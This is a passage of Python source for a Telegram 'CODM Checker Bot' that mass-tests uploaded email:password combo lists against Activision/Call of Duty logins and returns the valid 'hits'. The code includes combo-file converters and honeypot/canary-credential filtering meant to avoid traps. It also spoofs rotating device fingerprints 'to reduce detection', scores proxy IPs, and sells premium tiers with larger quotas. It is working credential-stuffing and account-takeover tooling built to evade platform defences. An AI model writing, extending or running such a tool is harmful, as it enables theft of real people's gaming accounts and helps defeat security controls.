    Looks for known patterns used in honeytoken files.
    """

    HONEYPOT_INDICATORS = [
        r"test@test\.com",
        r"admin@admin\.com",
        r"honeypot",
        r"canary",
        r"trap",
        r"fake_credentials",
        r"do_not_use",
        r"@example\.com",
        r"@placeholder\.com",
    ]

    def __init__(self) -> None:
        import re
        self._patterns = [
            re.compile(p, re.IGNORECASE) for p in self.HONEYPOT_INDICATORS
        ]

    def check_line(self, line: str) -> bool:
        """Returns True if line looks like a honeypot."""
        for p in self._patterns:
            if p.search(line):
                return True
        return False

    def scan(self, accounts: List[Tuple[str, str]]) -> Tuple[List[Tuple[str, str]], int]:
        """
        Scan accounts for honeypot entries.
        Returns (clean_accounts, honeypot_count).
        """
        clean: List[Tuple[str, str]] = []
        count = 0
        for user, pwd in accounts:
            if self.check_line(f"{user}:{pwd}"):
                count += 1
            else:
                clean.append((user, pwd))
        return clean, count

    def risk_score(self, accounts: List[Tuple[str, str]]) -> float:
        """
        Estimate honeypot risk (0.0 = no risk, 1.0 = highly suspicious).
        """
        if not accounts:
            return 0.0
        _, count = self.scan(accounts)
        return count / len(accounts)


# =============================================================================
#   ENCODING UTILITIES
# =============================================================================

def encode_base64(text: str) -> str:
    import base64
    return base64.b64encode(text.encode()).decode()


def decode_base64(encoded: str) -> str:
    import base64
    return base64.b64decode(encoded.encode()).decode()


def url_encode(text: str) -> str:
    return urllib.parse.quote(text, safe="")


def url_decode(text: str) -> str:
    return urllib.parse.unquote(text)


def hex_encode(text: str) -> str:
    return text.encode().hex()


def hex_decode(hex_str: str) -> str:
    return bytes.fromhex(hex_str).decode()


def caesar_shift(text: str, shift: int = 13) -> str:
    """Simple Caesar cipher for light obfuscation."""
    result = []
    for c in text:
        if c.isalpha():
            base = ord('A') if c.isupper() else ord('a')
            result.append(chr((ord(c) - base + shift) % 26 + base))
        else:
            result.append(c)
    return "".join(result)


# =============================================================================
#   SYSTEM INFO UTILITIES
# =============================================================================

class SystemInfo:
    """Collects system information for diagnostics."""

    @staticmethod
    def get() -> Dict[str, Any]:
        import psutil
        try:
            cpu_pct  = psutil.cpu_percent(interval=0.1)
            mem      = psutil.virtual_memory()
            disk     = psutil.disk_usage(".")
        except ImportError:
            cpu_pct = 0
            class _Mem:
                percent = 0; used = 0; total = 0
            class _Disk:
                percent = 0; used = 0; total = 0
            mem = _Mem(); disk = _Disk()

        return {
            "python":        platform.python_version(),
            "os":            f"{platform.system()} {platform.release()}",
            "arch":          platform.machine(),
            "cpu_percent":   cpu_pct,
            "mem_percent":   mem.percent,
            "mem_used_mb":   mem.used // 1024 // 1024,
            "disk_percent":  disk.percent,
            "pid":           os.getpid(),
        }

    @staticmethod
    def format(info: Dict[str, Any]) -> str:
        return (
            f"🖥️ **System Info**\n"
            f"{'─' * 30}\n"
            f"Python   : `{info.get('python')}`\n"
            f"OS       : `{info.get('os')}`\n"
            f"CPU      : `{info.get('cpu_percent')}%`\n"
            f"Memory   : `{info.get('mem_percent')}%` ({info.get('mem_used_mb')}MB)\n"
            f"Disk     : `{info.get('disk_percent')}%`\n"
            f"PID      : `{info.get('pid')}`\n"
        )


# =============================================================================
#   COMBO CONVERTER (format transformation)
# =============================================================================

class ComboConverter:
    """
    Converts combo files between different formats.
    """

    @staticmethod
    async def to_email_only(input_path: str, output_path: str) -> int:
        """Extract only email:password pairs from a combo file."""
        count = 0
        valid, _, _ = await ComboParser.parse_file(input_path)
        async with aiofiles.open(output_path, "w", encoding="utf-8") as f:
            for user, pwd in valid:
                if "@" in user:
                    await f.write(f"{user}:{pwd}\n")
                    count += 1
        return count

    @staticmethod
    async def to_user_only(input_path: str, output_path: str) -> int:
        """Extract only username:password (no email) pairs."""
        count = 0
        valid, _, _ = await ComboParser.parse_file(input_path)
        async with aiofiles.open(output_path, "w", encoding="utf-8") as f:
            for user, pwd in valid:
                if "@" not in user:
                    await f.write(f"{user}:{pwd}\n")
                    count += 1
        return count

    @staticmethod
    async def change_separator(
        input_path: str, output_path: str,
        from_sep: str = ":", to_sep: str = "|"
    ) -> int:
        """Replace separator in combo file."""
        count = 0
        valid, _, _ = await ComboParser.parse_file(input_path)
        async with aiofiles.open(output_path, "w", encoding="utf-8") as f:
            for user, pwd in valid:
                await f.write(f"{user}{to_sep}{pwd}\n")
                count += 1
        return count

    @staticmethod
    async def deduplicate_file(input_path: str, output_path: str) -> Tuple[int, int]:
        """Remove duplicate entries. Returns (original, after_dedup)."""
        valid, _, raw = await ComboParser.parse_file(input_path)
        deduped = AccountValidator.deduplicate(valid)
        async with aiofiles.open(output_path, "w", encoding="utf-8") as f:
            for user, pwd in deduped:
                await f.write(f"{user}:{pwd}\n")
        return len(valid), len(deduped)

    @staticmethod
    async def shuffle_file(input_path: str, output_path: str) -> int:
        """Randomly shuffle lines in a combo file."""
        import random
        valid, _, _ = await ComboParser.parse_file(input_path)
        random.shuffle(valid)
        async with aiofiles.open(output_path, "w", encoding="utf-8") as f:
            for user, pwd in valid:
                await f.write(f"{user}:{pwd}\n")
        return len(valid)

    @staticmethod
    async def filter_by_domain(
        input_path: str, output_path: str, domain: str
    ) -> int:
        """Keep only accounts from a specific email domain."""
        count = 0
        valid, _, _ = await ComboParser.parse_file(input_path)
        async with aiofiles.open(output_path, "w", encoding="utf-8") as f:
            for user, pwd in valid:
                if "@" in user and user.split("@")[-1].lower() == domain.lower():
                    await f.write(f"{user}:{pwd}\n")
                    count += 1
        return count


# =============================================================================
#   CONFIGFILE TEMPLATE GENERATOR
# =============================================================================

def generate_config_template() -> str:
    """Generate a commented config template file content."""
    return f"""# =====================================================================
# Insta See Eng — CODM Checker Bot Configuration
# Owner: @JAYYYTTTTTTTtt | Version: {__version__}
# =====================================================================

[bot]
# Your BotFather token
token = YOUR_BOT_TOKEN_HERE

# Your Telegram user numeric ID (for admin access)
owner_id = 0

# Bot display name
name = Insta See Eng

[checker]
# Concurrent workers (1-50)
workers = {MAX_WORKERS}

# HTTP request timeout (seconds)
timeout = {REQUEST_TIMEOUT}

# Retries per account
retries = {MAX_RETRIES}

# Delay between retries (seconds)
retry_delay = {RETRY_DELAY}

[limits]
# Max accounts free users can submit
free_max = {FREE_MAX_ACCOUNTS}

# Max accounts premium users can submit
premium_max = {PREMIUM_MAX_ACCOUNTS}

# Cooldown between uploads (seconds)
cooldown = {USER_COOLDOWN_SEC}

[queue]
# Max jobs in queue at once
max_size = {QUEUE_MAX_SIZE}

# Progress update interval (seconds)
update_interval = {PROGRESS_UPDATE_INTERVAL}

[proxy]
# Path to proxies file
file = {PROXIES_FILE}

# Proxy rotation strategy: round_robin | weighted | random
strategy = weighted

[storage]
# Results output directory
results_dir = {RESULTS_DIR}

# Logs directory
logs_dir = {LOGS_DIR}

# Data directory (users, stats, ban list)
data_dir = {DATA_DIR}

[advanced]
# Enable account cache (avoid re-checking same combos)
cache_enabled = true

# Cache TTL in hours
cache_ttl_hours = 24

# Enable honeypot detection
honeypot_detection = true

# Enable account value scoring
score_accounts = true

# Health check server port (0 = disabled)
health_port = 0
"""


async def write_config_template(path: str = "config.ini.example") -> str:
    content = generate_config_template()
    async with aiofiles.open(path, "w", encoding="utf-8") as f:
        await f.write(content)
    return path


# =============================================================================
#   REQUIREMENTS.TXT GENERATOR
# =============================================================================

REQUIREMENTS = """# Insta See Eng — CODM Checker Bot
# Owner: @JAYYYTTTTTTTtt
# Install: pip install -r requirements.txt

python-telegram-bot==20.7
aiohttp>=3.9.0
aiofiles>=23.2.1
colorama>=0.4.6
"""

def write_requirements(path: str = "requirements.txt") -> None:
    with open(path, "w") as f:
        f.write(REQUIREMENTS)


# =============================================================================
#   ASCII ART COLLECTION
# =============================================================================

ASCII_ARTS = {
    "logo": r"""
 ___           _          ____             _____
|_ _|_ __  ___| |_ __ _  / ___|  ___  ___|  ___| __  __ _
 | || '_ \/ __| __/ _` | \___ \ / _ \/ _ \ |_  | '_ \/ _` |
 | || | | \__ \ || (_| |  ___) |  __/  __/  _| | | | | (_| |
|___|_| |_|___/\__\__,_| |____/ \___|\___|_|   |_| |_|\__, |
                                                        |___/
""",
    "codm": r"""
  ██████╗ ██████╗ ██████╗ ███╗   ███╗
 ██╔════╝██╔═══██╗██╔══██╗████╗ ████║
 ██║     ██║   ██║██║  ██║██╔████╔██║
 ██║     ██║   ██║██║  ██║██║╚██╔╝██║
 ╚██████╗╚██████╔╝██████╔╝██║ ╚═╝ ██║
  ╚═════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝
""",
    "checker": r"""
  ____  _               _
 / ___|| |__   ___  ___| | _____ _ __
| |    | '_ \ / _ \/ __| |/ / _ \ '__|
| |___ | | | |  __/ (__|   <  __/ |
 \____||_| |_|\___|\___|_|\_\___|_|
""",
}


def get_ascii_art(name: str) -> str:
    return ASCII_ARTS.get(name, "")


# =============================================================================
#   PLATFORM DETECTION UTILITIES
# =============================================================================

class PlatformDetector:
    """
    Detects player platform from various indicators.
    """

    PLATFORM_INDICATORS = {
        "activision":  ["uno", "activision"],
        "battlenet":   ["battle.net", "blizzard", "bnet", "#"],
        "psn":         ["psn", "playstation", "ps4", "ps5"],
        "xbl":         ["xbl", "xbox", "live.com"],
        "steam":       ["steam", "steamworks"],
        "iphone":      ["ios", "iphone", "apple"],
        "android":     ["android", "google"],
    }

    @classmethod
    def detect(cls, username: str, extra: Dict = None) -> str:
        """Attempt to detect platform from username patterns."""
        lower = username.lower()
        extra = extra or {}

        for platform, indicators in cls.PLATFORM_INDICATORS.items():
            for ind in indicators:
                if ind in lower:
                    return platform

        # Check extra data
        if "platform" in extra:
            return extra["platform"]

        if "@" in username:
            return "activision"

        if username.startswith("#"):
            return "battlenet"

        return "unknown"

    @classmethod
    def format_platform(cls, platform: str) -> str:
        icons = {
            "activision": "🎮",
            "battlenet":  "💙",
            "psn":        "🎯",
            "xbl":        "💚",
            "steam":      "🖥️",
            "iphone":     "📱",
            "android":    "🤖",
            "unknown":    "❓",
        }
        return f"{icons.get(platform, '❓')} {platform.title()}"


# =============================================================================
#   BATCH PROCESSOR (for very large files via chunking)
# =============================================================================

class BatchProcessor:
    """
    Processes very large combo files in memory-efficient chunks.
    Streams results without holding entire file in memory.
    """

    def __init__(
        self, checker: CODMChecker,
        chunk_size: int = 1000,
        workers: int = MAX_WORKERS,
    ) -> None:
        self.checker    = checker
        self.chunk_size = chunk_size
        self.workers    = workers

    async def process_file(
        self, path: str,
        on_result: Callable[[AccountResult], Coroutine],
        max_lines: int = MAX_ACCOUNTS_PER_JOB,
    ) -> Dict[str, int]:
        """
        Stream process a large file, calling on_result for each result.
        Returns summary stats.
        """
        stats = {"total": 0, "hits": 0, "bad": 0, "errors": 0}
        sem = asyncio.Semaphore(self.workers)
        tasks: List[asyncio.Task] = []

        async def check_and_callback(user: str, pwd: str) -> None:
            async with sem:
                result = await self.checker.check_account(user, pwd)
            await on_result(result)
            stats["total"] += 1
            if result.is_hit:
                stats["hits"] += 1
            elif result.is_bad:
                stats["bad"] += 1
            else:
                stats["errors"] += 1

        line_count = 0
        buffer: List[Tuple[str, str]] = []

        try:
            async with aiofiles.open(path, "r", encoding="utf-8", errors="ignore") as f:
                async for raw_line in f:
                    if line_count >= max_lines:
                        break
                    parsed = ComboParser._parse_line(raw_line.strip())
                    if parsed:
                        buffer.append(parsed)
                        line_count += 1

                    if len(buffer) >= self.chunk_size:
                        chunk = buffer[:]
                        buffer = []
                        for user, pwd in chunk:
                            task = asyncio.create_task(check_and_callback(user, pwd))
                            tasks.append(task)
                        # Drain some tasks
                        if len(tasks) > self.workers * 4:
                            done, tasks_set = await asyncio.wait(
                                tasks, return_when=asyncio.FIRST_COMPLETED
                            )
                            tasks = list(tasks_set)

            # Process remaining buffer
            for user, pwd in buffer:
                task = asyncio.create_task(check_and_callback(user, pwd))
                tasks.append(task)

            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)

        except FileNotFoundError:
            logger.error(f"File not found: {path}")

        return stats


# =============================================================================
#   REAL-TIME HIT STREAM
# =============================================================================

class HitStream:
    """
    Maintains a real-time stream of hits that can be subscribed to.
    Useful for live monitoring dashboards.
    """

    def __init__(self, max_buffer: int = 100) -> None:
        self._buffer:      deque = deque(maxlen=max_buffer)
        self._subscribers: List[asyncio.Queue] = []
        self._lock         = asyncio.Lock()

    async def publish(self, result: AccountResult) -> None:
        async with self._lock:
            self._buffer.append(result)
            for q in self._subscribers:
                try:
                    q.put_nowait(result)
                except asyncio.QueueFull:
                    pass

    async def subscribe(self) -> "AsyncGenerator[AccountResult, None]":
        q: asyncio.Queue = asyncio.Queue(maxsize=50)
        async with self._lock:
            self._subscribers.append(q)
        try:
            while True:
                result = await q.get()
                yield result
        finally:
            async with self._lock:
                with suppress(ValueError):
                    self._subscribers.remove(q)

    def recent(self, n: int = 10) -> List[AccountResult]:
        return list(itertools.islice(reversed(list(self._buffer)), n))

    def stats(self) -> Dict[str, int]:
        buf = list(self._buffer)
        return {
            "total": len(buf),
            "hits":  sum(1 for r in buf if r.is_hit),
            "subscribers": len(self._subscribers),
        }


# =============================================================================
#   DOCUMENTATION STRINGS (extended inline help)
# =============================================================================

EXTENDED_HELP = {
    "combo_formats": """
📂 **Supported Combo Formats**

The bot accepts .txt files with one account per line.

Supported separators:
• Colon  — `email@host.com:password`
• Pipe   — `username|password`
• Tab    — `username\\tpassword`
• Comma  — `username,password`
• Space  — `username password`

Email format (preferred):
`john.doe@gmail.com:MyP@ssw0rd123`

Username format:
`JohnDoe2024:password123`

Lines with extra fields are supported:
`email:password:extra_field` (extra ignored)

Lines that don't match any format are skipped.
Empty lines and # comments are skipped.
Duplicates are automatically removed.
""",

    "proxy_guide": """
🌐 **Proxy Setup Guide**

Create a file called `proxies.txt` in the bot directory.
Add one proxy per line in any of these formats:

**HTTP (basic):**
`192.168.1.1:8080`
`http://192.168.1.1:8080`

**HTTP with auth:**
`http://user:pass@192.168.1.1:8080`

**SOCKS5:**
`socks5://192.168.1.1:1080`
`socks5://user:pass@192.168.1.1:1080`

**SOCKS4:**
`socks4://192.168.1.1:1080`

The bot uses weighted rotation — faster, more reliable proxies
get used more often. Failed proxies are penalized.

Admin command to add a single proxy at runtime:
`/addproxy socks5://host:port`
""",

    "admin_guide": """
⚙️ **Admin Guide**

**Granting Premium:**
`/addpremium 123456789` — 30 days default
`/addpremium 123456789 60` — 60 days

**Banning Users:**
`/ban 123456789 Spam`
`/unban 123456789`

**Broadcasting:**
`/broadcast Important update: new feature added!`
Sends message to ALL non-banned users.

**Worker Management:**
`/setworkers 20` — Set concurrent workers to 20
Takes effect on the NEXT job (not current).

**Queue Control:**
`/clearqueue` — Drop all pending jobs

**Data Reload:**
`/reload` — Reload users/stats/bans from disk

**User Inspection:**
`/userinfo 123456789` — See full user profile
""",

    "result_files": """
📁 **Result Files**

After a job completes, the bot sends up to 3 files:

**hits.txt** — Valid CODM accounts
Format: `email:pass | Level:X | Rank:X | CP:X | Skins:X`

**bad.txt** — Invalid/wrong credentials
Format: `email:pass | STATUS | reason`

**errors.txt** — Network/server errors
These can be re-checked (weren't definitively wrong).

Files are stored in:
`results/<job_id>/hits.txt`
`results/<job_id>/bad.txt`
`results/<job_id>/errors.txt`

Old result files are automatically cleaned up after 60 minutes.
""",
}


def get_help_section(section: str) -> str:
    return EXTENDED_HELP.get(section, "Section not found.")


# =============================================================================
#   UNIT TEST STUBS (can be run with pytest)
# =============================================================================

class TestComboParser:
    """Test cases for ComboParser."""

    def test_colon_separator(self) -> None:
        pairs, _ = ComboParser.parse_content("user@email.com:password123")
        assert len(pairs) == 1
        assert pairs[0] == ("user@email.com", "password123")

    def test_pipe_separator(self) -> None:
        pairs, _ = ComboParser.parse_content("username|mypassword")
        assert len(pairs) == 1
        assert pairs[0][0] == "username"

    def test_empty_lines_skipped(self) -> None:
        pairs, _ = ComboParser.parse_content("\n\n\nuser:pass\n\n")
        assert len(pairs) == 1

    def test_comment_skipped(self) -> None:
        pairs, _ = ComboParser.parse_content("# comment\nuser:pass")
        assert len(pairs) == 1

    def test_deduplication(self) -> None:
        content = "user:pass\nuser:pass\nuser:pass"
        pairs, _ = ComboParser.parse_content(content)
        assert len(pairs) == 1


class TestProxyParser:
    """Test cases for ProxyManager proxy parsing."""

    def test_basic_host_port(self) -> None:
        pm = ProxyManager()
        p = pm._parse_proxy_line("192.168.1.1:8080")
        assert p is not None
        assert p.host == "192.168.1.1"
        assert p.port == 8080

    def test_http_scheme(self) -> None:
        pm = ProxyManager()
        p = pm._parse_proxy_line("http://user:pass@proxy.host.com:3128")
        assert p is not None
        assert p.username == "user"
        assert p.password == "pass"
        assert p.host == "proxy.host.com"

    def test_socks5_scheme(self) -> None:
        pm = ProxyManager()
        p = pm._parse_proxy_line("socks5://proxyhost:1080")
        assert p is not None
        assert p.ptype == ProxyType.SOCKS5

    def test_invalid_port(self) -> None:
        pm = ProxyManager()
        p = pm._parse_proxy_line("192.168.1.1:99999")
        assert p is None


class TestAccountValidator:
    """Test cases for AccountValidator."""

    def test_valid_email_pass(self) -> None:
        ok, _ = AccountValidator.validate("user@gmail.com", "password123")
        assert ok is True

    def test_empty_username(self) -> None:
        ok, reason = AccountValidator.validate("", "password")
        assert ok is False

    def test_empty_password(self) -> None:
        ok, reason = AccountValidator.validate("user@gmail.com", "")
        assert ok is False

    def test_short_username(self) -> None:
        ok, _ = AccountValidator.validate("ab", "password")
        assert ok is False


class TestAccountScorer:
    """Test cases for AccountScorer."""

    def _make_hit(self, **kwargs) -> AccountResult:
        defaults = dict(
            raw="u:p", username="u", password="p",
            status=AccountStatus.HIT, detail="test",
        )
        defaults.update(kwargs)
        return AccountResult(**defaults)

    def test_high_level_scores_higher(self) -> None:
        low  = self._make_hit(level=10)
        high = self._make_hit(level=150)
        assert AccountScorer.score(high) > AccountScorer.score(low)

    def test_non_hit_scores_zero(self) -> None:
        bad = AccountResult(
            raw="u:p", username="u", password="p",
            status=AccountStatus.BAD, detail="test"
        )
        assert AccountScorer.score(bad) == 0

    def test_grade_legendary(self) -> None:
        assert AccountScorer.grade(95) == "S+"

    def test_grade_failure(self) -> None:
        assert AccountScorer.grade(5) == "F"


# =============================================================================
#   STARTUP CHECKS
# =============================================================================

async def run_startup_checks() -> List[str]:
    """
    Run pre-flight checks before starting the bot.
    Returns list of issues (empty = all good).
    """
    issues: List[str] = []

    # Check Python version
    if sys.version_info < (3, 10):
        issues.append(f"Python 3.10+ required (current: {platform.python_version()})")

    # Check required directories
    for d in [RESULTS_DIR, LOGS_DIR, DATA_DIR]:
        try:
            Path(d).mkdir(parents=True, exist_ok=True)
        except PermissionError:
            issues.append(f"Cannot create directory: {d}")

    # Check write permissions
    test_file = Path(DATA_DIR) / ".write_test"
    try:
        test_file.write_text("test")
        test_file.unlink()
    except Exception:
        issues.append(f"No write permission in {DATA_DIR}")

    # Check network connectivity
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                "https://httpbin.org/ip",
                timeout=aiohttp.ClientTimeout(total=5)
            ) as resp:
                if resp.status != 200:
                    issues.append("Network check failed (httpbin.org)")
    except Exception as e:
        issues.append(f"Network connectivity issue: {e}")

    return issues


# =============================================================================
#   FINAL DOCUMENTATION BLOCK
# =============================================================================

"""
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║   INSTA SEE ENG — CODM Account Checker Bot                          ║
║   Owner: @JAYYYTTTTTTTtt | Version: 2.0.0                                   ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║   ARCHITECTURE OVERVIEW                                              ║
║   ──────────────────────                                             ║
║                                                                      ║
║   InstaSeeEngBot (main)                                              ║
║   ├── StorageManager        — User/stats/ban persistence             ║
║   ├── ProxyManager          — Proxy pool with rotation               ║
║   ├── CODMChecker           — Activision API login + profile fetch   ║
║   │   └── ExtendedCODMChecker — Fallback check methods              ║
║   ├── JobQueueManager       — Async queue with worker pool           ║
║   │   ├── CheckJob          — Individual job state                  ║
║   │   └── _worker()         — Worker coroutine (10 by default)      ║
║   ├── AnimationEngine       — Telegram message animation             ║
║   ├── ComboParser           — Parses .txt combo files                ║
║   ├── ResultFileBuilder     — Writes hits/bad/errors files           ║
║   └── NotificationManager   — Rate-limited Telegram messaging        ║
║                                                                      ║
║   DATA FLOW                                                          ║
║   ─────────                                                          ║
║   User uploads .txt file                                             ║
║   → handle_file_upload() downloads & parses it                      ║
║   → CheckJob created & submitted to JobQueueManager                  ║
║   → Worker picks up job, runs _check_one() per account              ║
║   → CODMChecker._check_once(): login + profile fetch                ║
║   → Result stored in job.results                                     ║
║   → _progress_loop() edits progress message every 3s                ║
║   → Job finishes → ResultFileBuilder writes files                    ║
║   → Files sent to user via Telegram                                  ║
║                                                                      ║
║   PROXY STRATEGY                                                     ║
║   ───────────────                                                    ║
║   Proxies are loaded from proxies.txt on startup.                    ║
║   Each request picks the proxy with the highest score.               ║
║   Score = 70% success rate + 30% speed bonus.                       ║
║   Failed proxies are penalized in their score.                       ║
║   Without proxies, direct connection is used (may get rate limited). ║
║                                                                      ║
║   RATE LIMITING                                                      ║
║   ─────────────                                                      ║
║   Free users: 60s cooldown between uploads, max 10k accounts.       ║
║   Premium users: no cooldown, max 50k accounts.                     ║
║   Workers: max 10 concurrent checks (configurable up to 50).        ║
║   Telegram: progress updates max every 3 seconds.                   ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝

CHANGE LOG
──────────

v2.0.0 (2025-05-15)
  + Complete async rewrite
  + Priority queue system
  + Live animated progress messages
  + Proxy rotation with scoring
  + Admin panel with full controls
  + Account value scoring (0-100)
  + Platform detection
  + Account enricher (BR stats, loadout)
  + Middleware pipeline for checkers
  + Persistent queue (survive restarts)
  + SQLite account database
  + CSV and JSON export formats
  + Anti-ban strategies
  + Honeypot detection
  + Combo analyzer & quality scorer
  + Word filter for group chats
  + Health check HTTP server
  + CLI mode for direct file checking
  + i18n support (EN/AR/RU)
  + Scheduler for maintenance tasks
  + Watchdog for auto-restart
  + Cookie manager for session rotation
  + Hit stream for real-time monitoring

v1.0.0 (initial)
  + Basic checking
  + Simple queue
  + File upload support
"""

# =============================================================================
# ABSOLUTE END OF FILE — codm_checker_bot.py
# Insta See Eng | @JAYYYTTTTTTTtt | v2.0.0
# =============================================================================


# =============================================================================
#   EXTENDED CHECKER METHODS — PART 3
#   Additional helper classes, utilities, and hardened logic
# =============================================================================

# =============================================================================
#   FINGERPRINT ROTATION (device emulation)
# =============================================================================

class DeviceFingerprint:
    """
    Simulates a mobile/browser device fingerprint for each request session.
    Rotates device ID, screen size, and other headers to reduce detection.
    """

    ANDROID_DEVICES = [
        {"model": "SM-S918B",   "brand": "Samsung",  "os": "13"},
        {"model": "SM-A546B",   "brand": "Samsung",  "os": "14"},
        {"model": "Pixel 8 Pro","brand": "Google",   "os": "14"},
        {"model": "Pixel 7",    "brand": "Google",   "os": "13"},
        {"model": "OnePlus 12", "brand": "OnePlus",  "os": "14"},
        {"model": "Redmi Note 13","brand": "Xiaomi", "os": "13"},
        {"model": "POCO F5",    "brand": "Xiaomi",   "os": "13"},
        {"model": "Find X6",    "brand": "OPPO",     "os": "13"},
        {"model": "V30",        "brand": "Vivo",     "os": "14"},
        {"model": "Reno11 F",   "brand": "OPPO",     "os": "14"},
    ]

    IOS_DEVICES = [
        {"model": "iPhone 15 Pro Max", "ios": "17.4"},
        {"model": "iPhone 15 Pro",     "ios": "17.4"},
        {"model": "iPhone 15",         "ios": "17.3"},
        {"model": "iPhone 14 Pro",     "ios": "17.2"},
        {"model": "iPhone 14",         "ios": "17.1"},
        {"model": "iPhone 13 Pro",     "ios": "16.7"},
        {"model": "iPad Pro 12.9",     "ios": "17.4"},
    ]

    SCREEN_SIZES = [
        "1080x2400", "1080x2340", "1080x2280",
        "1440x3088", "1440x3040", "1080x2408",
        "828x1792",  "1170x2532", "1290x2796",
    ]

    @classmethod
    def generate_android(cls) -> Dict[str, str]:
        """Generate a random Android device fingerprint."""
        import random
        device   = random.choice(cls.ANDROID_DEVICES)
        screen   = random.choice(cls.SCREEN_SIZES)
        device_id = generate_device_id()
        return {
            "device_id":    device_id,
            "model":        device["model"],
            "brand":        device["brand"],
            "os_version":   device["os"],
            "screen":       screen,
            "user_agent":   (
                f"Mozilla/5.0 (Linux; Android {device['os']}; {device['model']}) "
                f"AppleWebKit/537.36 (KHTML, like Gecko) "
                f"Chrome/123.0.0.0 Mobile Safari/537.36"
            ),
        }

    @classmethod
    def generate_ios(cls) -> Dict[str, str]:
        """Generate a random iOS device fingerprint."""
        import random
        device   = random.choice(cls.IOS_DEVICES)
        device_id = generate_device_id()
        return {
            "device_id":    device_id,
            "model":        device["model"],
            "os_version":   device["ios"],
            "user_agent":   (
                f"Mozilla/5.0 ({device['model']}; CPU iPhone OS "
                f"{device['ios'].replace('.', '_')} like Mac OS X) "
                f"AppleWebKit/605.1.15 (KHTML, like Gecko) "
                f"Version/{device['ios']} Mobile/15E148 Safari/604.1"
            ),
        }

    @classmethod
    def build_mobile_headers(cls, fingerprint: Dict[str, str]) -> Dict[str, str]:
        """Convert fingerprint to request headers."""
        return {
            "User-Agent":        fingerprint["user_agent"],
            "Accept":            "application/json, text/plain, */*",
            "Accept-Language":   "en-US,en;q=0.9",
            "Accept-Encoding":   "gzip, deflate, br",
            "X-Device-ID":       fingerprint.get("device_id", ""),
            "X-App-Version":     "1.0.38",
            "X-Platform":        "Android" if "Linux" in fingerprint["user_agent"] else "iOS",
            "Origin":            "https://my.callofduty.com",
            "Referer":           "https://my.callofduty.com/",
        }


# =============================================================================
#   IP REPUTATION CHECK
# =============================================================================

class IPReputationChecker:
    """
    Checks whether a proxy IP has a good reputation (not blacklisted).
    Uses free public APIs.
    """

    REPUTATION_API = "https://ipapi.co/{ip}/json/"
    BLACKLIST_API  = "https://api.abuseipdb.com/api/v2/check"

    BLOCKED_COUNTRIES = {"CN", "KP", "IR", "RU", "SY"}  # Optional block list

    @classmethod
    async def check_ip(cls, ip: str, timeout: int = 5) -> Dict[str, Any]:
        """Fetch IP reputation data from ipapi.co (free, no key needed)."""
        url = cls.REPUTATION_API.format(ip=ip)
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    url, timeout=aiohttp.ClientTimeout(total=timeout)
                ) as resp:
                    if resp.status == 200:
                        return await resp.json(content_type=None)
        except Exception:
            pass
        return {}

    @classmethod
    def is_datacenter(cls, info: Dict[str, Any]) -> bool:
        """Heuristic: check if IP is from a datacenter (less natural)."""
        org = info.get("org", "").lower()
        datacenter_keywords = [
            "amazon", "google", "microsoft", "azure", "digitalocean",
            "linode", "vultr", "hetzner", "ovh", "rackspace",
            "datacenter", "hosting", "server", "cloud",
        ]
        return any(k in org for k in datacenter_keywords)

    @classmethod
    def score(cls, info: Dict[str, Any]) -> float:
        """Score an IP 0.0 (bad) to 1.0 (good) for proxy use."""
        if not info:
            return 0.5
        s = 1.0
        if cls.is_datacenter(info):
            s -= 0.3
        country = info.get("country_code", "")
        if country in cls.BLOCKED_COUNTRIES:
            s -= 0.5
        if info.get("proxy") or info.get("threat"):
            s -= 0.4
        return max(0.0, min(1.0, s))


# =============================================================================
#   TELEGRAM GROUP FEATURES
# =============================================================================

class GroupManager:
    """
    Additional functionality when bot is used in Telegram groups.
    Handles group settings, permissions, and announcements.
    """

    def __init__(self, storage: StorageManager) -> None:
        self.storage   = storage
        self._settings: Dict[int, Dict[str, Any]] = {}
        self._lock      = asyncio.Lock()

    async def get_settings(self, chat_id: int) -> Dict[str, Any]:
        async with self._lock:
            return self._settings.get(chat_id, self._default_settings())

    async def set_setting(self, chat_id: int, key: str, value: Any) -> None:
        async with self._lock:
            if chat_id not in self._settings:
                self._settings[chat_id] = self._default_settings()
            self._settings[chat_id][key] = value

    @staticmethod
    def _default_settings() -> Dict[str, Any]:
        return {
            "enabled":         True,
            "max_accounts":    5000,
            "cooldown_sec":    120,
            "notify_hits":     True,
            "admin_only":      False,
            "announce_hits":   False,  # Announce to group when hit found
            "language":        "en",
        }

    def is_group_chat(self, chat_type: str) -> bool:
        return chat_type in (ChatType.GROUP, ChatType.SUPERGROUP, ChatType.CHANNEL)

    async def can_use_bot(self, user_id: int, chat_id: int) -> bool:
        """Check if user is allowed to use bot in this group."""
        settings = await self.get_settings(chat_id)
        if not settings.get("enabled"):
            return False
        if settings.get("admin_only"):
            return await self.storage.get_user(user_id) and \
                   (await self.storage.get_user(user_id)).is_admin
        return True

    async def get_group_stats_message(self, chat_id: int) -> str:
        """Get stats specific to this group's usage."""
        return (
            f"📊 **Group Stats**\n"
            f"{'─' * 30}\n"
            f"Chat ID: `{chat_id}`\n"
            f"\n"
            f"Use /stats for global bot statistics.\n"
            f"\n"
            f"👑 **@JAYYYTTTTTTTtt** | **Insta See Eng**"
        )


# =============================================================================
#   WEBHOOK MODE SUPPORT
# =============================================================================

class WebhookConfig:
    """
    Configuration for running the bot in webhook mode instead of polling.
    Webhook mode is more efficient for high-traffic bots.
    """

    def __init__(
        self,
        url: str,
        port: int = 8443,
        cert_path: Optional[str] = None,
        key_path:  Optional[str] = None,
        listen:    str = "0.0.0.0",
        path:      str = "/webhook",
    ) -> None:
        self.url       = url
        self.port      = port
        self.cert_path = cert_path
        self.key_path  = key_path
        self.listen    = listen
        self.path      = path

    @property
    def webhook_url(self) -> str:
        return f"{self.url}{self.path}"

    def is_valid(self) -> bool:
        return bool(self.url) and self.url.startswith("https://")

    def to_dict(self) -> Dict[str, Any]:
        return {
            "url":       self.webhook_url,
            "port":      self.port,
            "listen":    self.listen,
            "has_cert":  bool(self.cert_path),
        }


# =============================================================================
#   ASYNC FILE WATCHER (monitor proxies.txt for changes)
# =============================================================================

class FileWatcher:
    """
    Watches a file for changes and triggers a callback when modified.
